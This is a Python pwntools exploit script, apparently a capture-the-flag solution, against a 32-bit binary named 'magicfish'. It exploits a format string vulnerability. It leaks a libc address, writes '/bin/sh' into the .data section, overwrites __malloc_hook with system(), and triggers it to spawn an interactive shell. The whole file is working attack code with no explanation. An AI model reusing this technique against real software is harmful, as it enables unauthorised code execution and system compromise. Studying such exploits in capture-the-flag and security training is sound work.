#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


context(arch='i386')

p = 0
b = ELF('./magicfish')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6') 

DEBUG = False
LOCAL = False

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print buf
    return buf

def start():
    global p, libc, b
    if p is not 0:
        p.close()
    if(LOCAL==False):
        libc = ELF('./libc.so.6') 
        p = remote('localhost',5555)
    else:
        libc = ELF('/lib/i386-linux-gnu/libc.so.6') 
        p = process('./magicfish')



start()
log.info("Leak libc addr")
ropchain="%08x%08x"
log.info("Get leak libc")
p.sendline(ropchain)

leak=p.recv(5000)
leak_libc = int(leak[8:16],16)
offset_leak=0x1d55c0
data=0x804a01d
libc.address=leak_libc-offset_leak

leak_malloc_hook = libc.symbols['__malloc_hook']
leak_system = libc.symbols['system']
leak_binsh = next(libc.search('/bin/sh\x00'))


log.info("Leak__malloc_hook: "+str(hex(leak_malloc_hook)))
log.info("Leak system "+str(hex(leak_system)))
log.info("Leak /bin/sh: "+str(hex(leak_binsh)))


log.info("Put /bin/sh in .data")

p.sendline(fmtstr_payload(7, {data:0x6e69622f }, write_size='short'))
p.sendline(fmtstr_payload(7, {data+4:0x68732f2f }, write_size='short'))

log.info("Rewrite __malloc_hook")
p.sendline(fmtstr_payload(7, {leak_malloc_hook: leak_system}, write_size='short'))

log.info("Trigger __malloc_hook")
p.sendline("%"+str(data-0x20)+"u")

p.interactive()
